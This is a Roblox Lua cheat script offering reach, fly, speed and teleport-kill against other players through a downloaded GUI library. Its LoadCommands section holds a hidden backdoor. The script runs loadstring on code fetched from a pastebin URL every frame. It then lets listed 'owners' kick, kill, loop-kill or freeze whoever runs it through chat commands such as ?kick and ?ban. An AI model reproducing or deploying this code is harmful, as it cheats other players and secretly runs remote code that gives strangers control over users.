local RunService = game:GetService("RunService")

local OwnerURL = "https://pastebin.com/raw/uM8T5Ld0"

local LoadScriptSTFOBTB = function()
	local Players = game:GetService("Players")
	local Boards = game.Workspace.Boards
	local Player = Players.LocalPlayer
	local Mouse = Player:GetMouse()

	local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pstrw/Reuploaded-Librarys/main/Venyx/source.lua"))()
	local Win = Lib.new("{ " .. Player.Name:lower() .. " } -- Made by jenn gu", 5013109572)

	local Tabs = {
		Combat = Win:addPage("Combat", 7485051715),
		Character = Win:addPage("Character", 13285102351),
		Visuals = Win:addPage("Visuals", 13321848320--[[6851126250]]),
	}

    local Sections = {
        Reach = Tabs.Combat:addSection("Reach"),
        ReachO = Tabs.Combat:addSection("Others"),
        Character = Tabs.Character:addSection("Speed"),
        CharacterO = Tabs.Character:addSection("Others"),
        Visuals = Tabs.Visuals:addSection("Visuals"),
	VisualsG = Tabs.Visuals:addSection("GUI"),
    }

    local Themes = {
		Background = Color3.fromRGB(24, 24, 24),
		Glow = Color3.fromRGB(0, 0, 0),
		Accent = Color3.fromRGB(10, 10, 10),
		LightContrast = Color3.fromRGB(20, 20, 20),
		DarkContrast = Color3.fromRGB(14, 14, 14),
		TextColor = Color3.fromRGB(255, 255, 255)
	}

	local Reach = false
	local RRange = 5
	local NotTrans = false

	getgenv().Whitelist = {"jengu"}

	local ESpeed = false
	local Speed = 0

	local BlockAnim = false
	local Flying = false
	local FSpeed = 0.2

	local TP = false
	local LockedTarget = nil

    local ViewPlayer = false
    local StopView = false

	local LID = 0

	local FindPlr = function(starting)
		starting = starting:lower()
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Name:lower():sub(1, #starting) == starting then
				return player
			end
		end
		return nil
	end

	local Notify = function(Title, Message)
		local CT = tick()
		if CT - LID >= 1 then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = Title,
				Text = Message,
				Duration = 3
			})
			LID = CT
		end
	end

	local Whitelist = function(PlayerName)
		local Player = FindPlr(PlayerName)
		if Player then
			if not table.find(getgenv().Whitelist, Player.Name) then
				table.insert(getgenv().Whitelist, Player.Name)
			end
			Notify('Whitelist', Player.Name .. " has been added to the whitelist.")
		else
			Notify('Whitelist', "Player not found.")
		end
	end

	local Blacklist = function(PlayerName)
		local Player = FindPlr(PlayerName)
		if Player then
			local Index = table.find(getgenv().Whitelist, Player.Name)
			if Index then
				table.remove(getgenv().Whitelist, Index)
			end
			Notify('Blacklist', Player.Name .. " has been removed from the whitelist.")
		else
			Notify('Blacklist', "Player not found.")
		end
	end

	local WhitelistAll = function()
		for _, Player in ipairs(Players:GetPlayers()) do
			Whitelist(Player.Name)
		end
		Notify('Whitelist', "Whitelisted all players.")
	end

	local BlacklistAll = function()
		for _, Player in ipairs(Players:GetPlayers()) do
			Blacklist(Player.Name)
		end
		Notify('Blacklist', "Blacklisted all players.")
	end

	local Fly = function(enabled)
		repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		repeat wait() until Mouse

		if flyKeyDown or flyKeyUp then
			flyKeyDown:Disconnect()
			flyKeyUp:Disconnect()
		end

		local Character = Players.LocalPlayer.Character
		local T = Character:FindFirstChild("HumanoidRootPart") or Character:FindFirstChildOfClass("Model"):FindFirstChild("HumanoidRootPart")
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0

		if enabled then
			Flying = true
			BlockAnim = true
			local BG = Instance.new('BodyGyro')
			local BV = Instance.new('BodyVelocity')
			BG.P = 9e4
			BG.Parent = T
			BV.Parent = T
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

			task.spawn(function()
				repeat
					wait()
					if not enabled and Character:FindFirstChildOfClass('Humanoid') then
						Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
					end
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0, 0)
					end
					BG.cframe = game.Workspace.CurrentCamera.CoordinateFrame
				until not Flying
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:Destroy()
				BV:Destroy()
				if Character:FindFirstChildOfClass('Humanoid') then
					Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
				end
			end)

			flyKeyDown = Mouse.KeyDown:Connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = FSpeed
				elseif KEY:lower() == 's' then
					CONTROL.B = -FSpeed
				elseif KEY:lower() == 'a' then
					CONTROL.L = -FSpeed
				elseif KEY:lower() == 'd' then
					CONTROL.R = FSpeed
				elseif KEY:lower() == 'e' then
					CONTROL.Q = FSpeed * 2
				elseif KEY:lower() == 'q' then
					CONTROL.E = -FSpeed * 2
				end
				pcall(function() game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
			end)

			flyKeyUp = Mouse.KeyUp:Connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = 0
				elseif KEY:lower() == 's' then
					CONTROL.B = 0
				elseif KEY:lower() == 'a' then
					CONTROL.L = 0
				elseif KEY:lower() == 'd' then
					CONTROL.R = 0
				elseif KEY:lower() == 'e' then
					CONTROL.Q = 0
				elseif KEY:lower() == 'q' then
					CONTROL.E = 0
				end
			end)
		else
			Flying = false
			BlockAnim = false
			if flyKeyDown or flyKeyUp then
				flyKeyDown:Disconnect()
				flyKeyUp:Disconnect()
			end
			if Character:FindFirstChildOfClass('Humanoid') then
				Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
			pcall(function() game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
		end
	end

	local Goto = function(TargetPlayer, duration)
		local Target = FindPlr(TargetPlayer)
		if not Target or not Target.Character or not Target.Character:FindFirstChild("HumanoidRootPart") then return end
		local BeforePos = Player.Character.HumanoidRootPart.CFrame
		Player.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * Settings.Offset
		task.wait(duration)
		Player.Character.HumanoidRootPart.CFrame = BeforePos
	end

	local HighlightPlayer = function(Character)
		if Character and Character:FindFirstChild("HumanoidRootPart") then
			local highlight = Instance.new("Highlight")
			highlight.Name = "Highlight"
			highlight.Adornee = Character
			highlight.FillColor = Color3.new(255, 0, 0)
			highlight.FillTransparency = 0.9
			highlight.OutlineColor = Color3.new(255, 0, 0)
			highlight.OutlineTransparency = 0.9
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.Parent = Character

			for _, child in ipairs(Character:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("Tool") then
					local childHighlight = Instance.new("Highlight")
					childHighlight.Name = "Highlight"
					childHighlight.Adornee = child
					childHighlight.FillColor = Color3.new(255, 0, 0)
					childHighlight.FillTransparency = 0.9
					childHighlight.OutlineColor = Color3.new(255, 0, 0)
					childHighlight.OutlineTransparency = 0.9
					childHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					childHighlight.Parent = child
				end
			end
		end
	end

	local RemoveHighlight = function(Character)
		if Character then
			for _, child in ipairs(Character:GetChildren()) do
				if child:FindFirstChild("Highlight") then
					child.Highlight:Destroy()
				end
			end
			if Character:FindFirstChild("Highlight") then
				Character.Highlight:Destroy()
			end
		end
	end

    local View = function(TargetPlayer, Me)
        if Me then
            local Camera = game.Workspace.CurrentCamera
            Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            Camera.CameraType = Enum.CameraType.Custom
        else
        local Target = FindPlr(TargetPlayer)
        if Target and Target.Character and Target.Character:FindFirstChild("Humanoid") then
            local Camera = game.Workspace.CurrentCamera
            Camera.CameraSubject = Target.Character:FindFirstChild("Humanoid")
            Camera.CameraType = Enum.CameraType.Custom
        end
    end
    end

	local HandleTargetDeath = function()
		if LockedTarget then
			Notify('Target', LockedTarget.Name .. " has died.")
			RemoveHighlight(LockedTarget)
			LockedTarget = nil
		end
	end

	local OnCharacter = function(char)
		if Flying then
			BlockAnim = false
			Fly(true)
		end
	end

	Sections.Reach:addToggle('Reach', nil, function(state)
		Reach = state
	end)

	Sections.Reach:addSlider('Detection Radius', 5, 5, 50, function(Value) -- start, lowest, highest
		RRange = Value
	end)

	Sections.ReachO:addToggle('Teleport Kill', nil, function(state)
		TP = state
		if not state then
			if LockedTarget then
				RemoveHighlight(LockedTarget)
				LockedTarget = nil
			end
		end
	end)

    Sections.ReachO:addToggle('View Target', nil, function(state)
        ViewPlayer = not ViewPlayer
    end)

	Sections.Character:addToggle('Enable Speed', nil, function(State)
		ESpeed = State
	end)

	Sections.Character:addSlider('Speed', 0, 0, 15, function(Value)
		Speed = Value == 0 and 0 or Value * 0.005
	end)

	Sections.CharacterO:addToggle('Fly', nil, function(State)
		Fly(State)
	end)

	Sections.CharacterO:addSlider('Gravity', 196, 90, 196, function(Value)
		game.Workspace.Gravity = Value
	end)

	Sections.Visuals:addToggle("Visible Body Part", nil, function(state)
		NotTrans = state
	end)

	Sections.Visuals:addToggle("Disable Boards", nil, function(state)
		BoardsTrans = state
	end)

	Sections.Visuals:addColorPicker("Baseplate Color", Color3.fromRGB(49, 138, 43), function(color)
		game.Workspace.Baseplate.Color = color
	end)

    Sections.VisualsG:addKeybind("Toggle GUI", Enum.KeyCode.LeftAlt, function()
        Win:toggle()
    end)

	Win:SelectPage(Win.pages[1], true)

	-- Handlers
	local BoardList = {
		Boards.SodaTimer.Screen, Boards.XPLeaders.Screen, Boards.SodasLeaders.Screen,
		Boards.KillsLeaders.Screen, Boards.TimeLeaders.Screen, Boards.SodaBoard.Screen,
		Boards.SodaLikeCounter.Screen, Boards.SodaInfo.Screen
	}

	local Commands = {
		wl = function(Args)
			local Arg = Args[2] and Args[2]:lower()
			if Arg == "all" then
				WhitelistAll()
			elseif Arg then
				Whitelist(Arg)
			end
		end,
		whitelist = function(Args)
			Commands.wl(Args)
		end,
		bl = function(Args)
			local Arg = Args[2] and Args[2]:lower()
			if Arg == "all" then
				BlacklistAll()
			elseif Arg then
				Blacklist(Arg)
			end
		end,
		blacklist = function(Args)
			Commands.bl(Args)
		end
	}

	for theme, color in pairs(Themes) do
		Sections.VisualsG:addColorPicker(theme, color, function(color3)
			Win:setTheme(theme, color3)
		end)
	end

	RunService.Heartbeat:Connect(function()
		if ESpeed and Player.Character then
			local Character = Player.Character
			local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
			local Humanoid = Character:FindFirstChild("Humanoid")
			if HumanoidRootPart and Humanoid then
				HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + Humanoid.MoveDirection * Speed
			end
		end

		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChild("Humanoid")
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= Player and not table.find(getgenv().Whitelist, player.Name) and Humanoid and Humanoid.Health ~= 0 then
				if Reach then
					local tool = Player.Character:FindFirstChildWhichIsA("Tool")
					local OCharacter = player.Character
					if tool and tool.Handle and tool:FindFirstChild("SwordScript") and OCharacter and OCharacter:FindFirstChild("HumanoidRootPart") then
						local distance = (Character.HumanoidRootPart.Position - OCharacter.HumanoidRootPart.Position).Magnitude
						if distance <= RRange then
							local limbs = {
								OCharacter:FindFirstChild("Left Arm"),
								OCharacter:FindFirstChild("Right Arm"),
								OCharacter:FindFirstChild("Left Leg"),
								OCharacter:FindFirstChild("Right Leg")
							}

							for _, limb in ipairs(limbs) do
								if limb then
									limb:BreakJoints()
									limb.CFrame = tool.Handle.CFrame
									limb.Transparency = NotTrans and 0 or 1
								end
							end
						end
					end
				end
			end
		end

		for _, board in ipairs(BoardList) do
			board.ScreenUI.Enabled = not BoardsTrans
			board.Transparency = BoardsTrans and 1 or 0.6
		end

		if Humanoid and Humanoid.Health ~= 0 then
			for _, track in ipairs(Humanoid:GetPlayingAnimationTracks()) do
				if BlockAnim then
					track:Stop()
				end
			end
		end

		if LockedTarget then
            if not LockedTarget:FindFirstChild("Humanoid") or LockedTarget.Humanoid.Health <= 0 then
                HandleTargetDeath()
                View(nil, true)
            else
                if ViewPlayer then
                    View(LockedTarget.Name)
                else
                    View(nil, true)
                end
            end
        else
            View(nil, true)
        end        
	end)

	Player.Chatted:Connect(function(Message)
		if Message then
			local CommandPart = Message:sub(1, 3):lower() == "/e " and Message:sub(4) or Message
			if CommandPart:sub(1, #Settings.CommandPrefix):lower() == Settings.CommandPrefix then
				local Args = CommandPart:sub(#Settings.CommandPrefix + 1):split(" ")
				local Command = Commands[Args[1]:lower()]
				if Command then
					Command(Args)
				end
			end
		end
	end)

	Mouse.KeyDown:Connect(function(key)
		local keyLower = key:lower()
		if TP then
			if keyLower == Settings.LockedKeybind then
				local target = Mouse.Target
				local character = target and target.Parent

				while character and not character:FindFirstChild("Humanoid") do
					character = character.Parent
				end

				if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 then
					if LockedTarget then
						RemoveHighlight(LockedTarget)
						if LockedTarget == character then
							LockedTarget = nil
							return
						end
					end
					LockedTarget = character
					HighlightPlayer(LockedTarget)
				elseif LockedTarget then
					RemoveHighlight(LockedTarget)
					LockedTarget = nil
				end
			elseif keyLower == Settings.TpKeybind and LockedTarget then
				Goto(LockedTarget.Name, Settings.WaitTime)
			end
		end
	end)

	Player.CharacterAdded:Connect(OnCharacter)
end

local LoadCommands = function()
	local Request = request or http_request or (http and http.request) or syn.request
	local Player = game.Players.LocalPlayer
	local Freeze = false
	local Safe = false
	local LK = false
	local PreviousOwners = {}
	local Connections = {}
	local LID = 0

	local SendMessage = function(username)
		local CT = tick()
		if CT - LID >= 1 then
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(username, "All")
			LID = CT
		end
	end

	local function PlayAnimation(enable, id, speed)
		if enable then
			PlayAnimation(false)
			Animation = Instance.new("Animation")
			Animation.AnimationId = "rbxassetid://" .. tostring(id)
			Animator = Player.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
			Animator:Play()
			Animator:AdjustSpeed(speed)
		else
			if Animator then
				Animator:Stop()
				Animation:Destroy()
				Animation = nil
				Animator = nil
			end
		end
	end

	local GetOwners = function()
		local success, response = pcall(function()
			return Request({
				Url = OwnerURL,
				Method = "GET"
			})
		end)

		if not success or not response or not response.Body then
			warn("Failed to fetch owners list.")
			return {}
		end

		local success, result = pcall(function()
			return loadstring(response.Body)()
		end)

		if not success or type(result) ~= "table" then
			return {}
		end

		return result
	end

	local CompareTables = function(Old, New)
		local oldSet = {}
		local newSet = {}
		local added = {}
		local removed = {}

		for _, user in ipairs(Old) do
			oldSet[user] = true
		end

		for _, user in ipairs(New) do
			newSet[user] = true
			if not oldSet[user] then
				table.insert(added, user)
			end
		end

		for _, user in ipairs(Old) do
			if not newSet[user] then
				table.insert(removed, user)
			end
		end

		return added, removed
	end

	local HandleChanges = function(added, removed)
		for _, user in ipairs(removed) do
			if Connections[user] then
				Connections[user]:Disconnect()
				Connections[user] = nil
				warn("Removed owner: " .. user)
			end
		end

		for _, user in ipairs(added) do
			local player = game.Players:FindFirstChild(user)
			if player and player ~= Player then
				Connections[user] = player.Chatted:Connect(function(message)
					if message:lower() == "?kick" then
						while task.wait() do
							Player:Kick("Owner of script requested kick!!!")
						end
					elseif message:lower() == "?ping" then
						SendMessage("pong!")
					elseif message:lower() == "?kill" then
						Player.Character:BreakJoints()
					elseif message:lower() == "?safe" then
						Player.Character:BreakJoints()
						Safe = true
					elseif message:lower() == "?unsafe" then
						Safe = false
					elseif message:lower() == "?loopkill" then
						LK = true
					elseif message:lower() == "?unloopkill" then
						LK = false
					elseif message:lower() == "?freeze" then
						Freeze = true
					elseif message:lower() == "?thaw" then
						Freeze = false
					elseif message:lower() == "?ban" then
						PlayAnimation(true, 148840371, 0)
						wait(0.5)
						while task.wait() do
							Player:Kick("you've been banned by ur script owner :sob:")
						end
					end
				end)
				warn("New owner: " .. user)
			end
		end
	end

	local OwnerJoined = function(player)
		local CurrentOwners = GetOwners()
		for _, user in ipairs(CurrentOwners) do
			if user == player.Name and not Connections[user] then
				Connections[user] = player.Chatted:Connect(function(message)
					warn(user .. " said: " .. message)
				end)
				warn("Owner joined: " .. user)
			end
		end
	end

	game.Players.PlayerAdded:Connect(OwnerJoined)

	RunService.RenderStepped:Connect(function()
		if Safe then
			local Plate = game.Workspace.Terrain.Spawn.Plate

			if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then
				return
			end

			if not Plate then
				return
			end

			local MinX = Plate.Position.X - Plate.Size.X / 2
			local MaxX = Plate.Position.X + Plate.Size.X / 2
			local MinZ = Plate.Position.Z - Plate.Size.Z / 2
			local MaxZ = Plate.Position.Z + Plate.Size.Z / 2

			local HPos = Player.Character.HumanoidRootPart.Position
			local CX = math.clamp(HPos.X, MinX, MaxX)
			local CZ = math.clamp(HPos.Z, MinZ, MaxZ)

			Player.Character.HumanoidRootPart.CFrame = CFrame.new(CX, Player.Character.HumanoidRootPart.Position.Y, CZ) * Player.Character.HumanoidRootPart.CFrame.Rotation
		end

		local CurrentOwners = GetOwners()

		if #CurrentOwners > 0 then
			local added, removed = CompareTables(PreviousOwners, CurrentOwners)

			if #added > 0 or #removed > 0 then
				HandleChanges(added, removed)
				PreviousOwners = table.clone(CurrentOwners)
			end
		end

		if Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.Humanoid.Health ~= 0 then
			Player.Character.HumanoidRootPart.Anchored = Freeze
			if LK then
				Player.Character:BreakJoints()
			end
		end
	end)
end

LoadScriptSTFOBTB()
LoadCommands()
LoadCommands()
